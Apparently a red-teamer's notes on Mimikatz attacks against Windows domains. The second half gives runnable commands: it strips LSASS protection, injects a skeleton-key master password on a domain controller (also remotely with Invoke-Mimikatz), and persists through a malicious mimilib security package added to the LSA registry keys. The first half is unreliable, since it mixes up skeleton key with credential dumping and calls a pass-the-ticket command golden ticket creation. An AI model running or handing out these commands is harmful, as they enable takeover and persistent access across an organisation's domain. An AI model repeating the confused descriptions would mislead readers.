
The **Skeleton module** in **Mimikatz** is used to interact with and extract information from the **Windows security subsystem**, particularly with the aim of dumping or manipulating credentials, including **hashes** and **tickets**. It’s an advanced tool typically employed in **post-exploitation** scenarios for red team activities or penetration testing.

### **Skeleton Module Overview**:

- **Purpose**: The **Skeleton** module is part of Mimikatz, designed to help exploit the Windows authentication process by extracting credential-related data from memory.
- **Key Use Cases**:
    1. **Credential Dumping**: Extracting password hashes, including NTLM hashes, and Kerberos tickets.
    2. **Pass-the-Hash Attacks**: Utilizing the captured hash data to perform authentication on other systems without needing the plaintext password.
    3. **Golden Ticket Creation**: In conjunction with other modules, Skeleton can be used to assist in creating **Golden Tickets**, which can be used to impersonate any user or escalate privileges to Domain Administrator.

### **Key Features**:

- **Credential Dumping**: It allows users to dump credential data from Windows memory, enabling the attacker to gather useful credentials for further lateral movement.
- **Memory Access**: Skeleton directly interacts with the **LSASS (Local Security Authority Subsystem Service)** process, where the authentication credentials (such as passwords and hashes) are stored.

### **How It Works**:

- The module interacts with **LSASS**, the Windows service responsible for enforcing the security policy on the system. When a user logs in, LSASS stores the credentials in memory, where they can be extracted by Mimikatz using the Skeleton module.
- Once credentials are extracted, attackers can **use these credentials for Pass-the-Hash** or use **Kerberos tickets** (such as **TGT** and **Golden Tickets**) to gain access to additional systems or escalate their privileges.

### Example Usage:

1. **Extracting Credentials**: Using Skeleton to dump credentials from LSASS memory.

```mimikatz
sekurlsa::logonpasswords
```
    This command will dump login credentials, including passwords and hash data.
    
2. **Creating Golden Tickets**: With the extracted **KRBTGT hash**, attackers can craft a **Golden Ticket** to impersonate any user (e.g., Domain Admin).
```
kerberos::ptt /ticket:<path to ticket>
```

### Caution:

- This module requires **administrator privileges** or **SYSTEM access** to work effectively, as it interacts with protected areas of the Windows operating system.
- The module can be flagged by endpoint security tools, and using it in unauthorized environments is illegal and unethical.

The **Skeleton** module is a core component of **Mimikatz** used for credential extraction, which is vital for performing sophisticated attacks and privilege escalation in Windows environments.


##### Command in mimikatz

SKELETON KEY
	this attack is very noisy ? why because it's load driver to run
	use the below command to inject skeleton key (password would be mimikatz) on a domain controller of choice. DA privilege needed to run this command
	this attack is for persistence and use this technique with mimikatz not stable on server 2016 and 2019
	`mimikatz # privilege::debug
	`mimikatz # !+
	`mimikatz # !processprotect /process:lsass.exe /remove
	`mimikatz # misc::skeleton
	`mimikatz # !-
	`PS > Invoke-mimikatz '"privilege::debug" "misc::skeleton"' -ComputerName domaincontroller.adolf.local
	now it's possible to access any machine  with valid username and credential as mimkatz
	`PS > Enter-Pssession -ComputerName domaincontroller -Credential adolf\administrator

PS MIMIKATZ
step 1 :  Drop mimilib.dll to system32 
step 2 : add registry
`PS > $pack = Get-ItemProperty hklm:\system\CurrentControlset\control\lsa\osconfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

`PS > $pack +="mimilib"

`PS > Set-ItemProperty hklm:\system\CurrentControlset\control\lsa\osconfig\ -Name 'Security Packages' -Value $pack

`PS > Set-ItemProperty hklm:\system\CurrentControlset\control\lsa\ -Name 'Security Packages' -Value $pack

step 3 : `C:\Windows\System32\kiwissp.log`
